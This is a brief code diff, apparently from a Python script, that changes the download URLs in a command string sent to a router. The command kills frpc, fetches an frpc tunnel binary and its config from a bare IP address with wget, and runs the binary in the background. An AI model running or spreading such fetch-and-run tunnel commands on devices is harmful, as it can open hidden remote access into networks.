@@ -31,9 +31,9 @@ try:
     
     router_cmd = """
     killall frpc
-    wget -q http://64.225.99.144:8081/frpc -O /tmp/frpc
+    wget -q http://64.225.99.144/frpc -O /tmp/frpc
     chmod +x /tmp/frpc
-    wget -q http://64.225.99.144:8081/frpc.ini -O /tmp/frpc.ini
+    wget -q http://64.225.99.144/frpc.ini -O /tmp/frpc.ini
     nohup /tmp/frpc -c /tmp/frpc.ini > /tmp/frpc.log 2>&1 &
     sleep 2
     ps | grep frpc | grep -v grep
